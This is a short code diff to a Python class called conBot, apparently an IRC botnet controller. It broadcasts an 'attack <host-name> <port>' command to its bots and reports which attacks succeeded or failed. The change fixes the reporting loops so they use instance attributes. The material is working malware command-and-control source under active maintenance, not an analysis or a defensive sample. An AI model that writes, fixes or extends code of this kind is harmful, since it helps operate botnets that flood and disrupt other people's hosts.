@@ -122,10 +122,10 @@ class conBot:
                     self.botsFailed = []
                     self.sendCommand("#" + self.CHANNEL, userCommand)
                     time.sleep(5)
-                    for bot in botsSuccessful:
+                    for bot in self.botsSuccessful:
                         print("{}: attack successful".format(bot))
-                    for bot in botsFailed:
-                        print("{}: attack failed, {}".format(bot, botsFailed[bot]))
+                    for bot in self.botsFailed:
+                        print("{}: attack failed, {}".format(bot, self.botsFailed[bot]))
                 else:
                     print("Incorrect usage of command: attack <host-name> <port>")
 
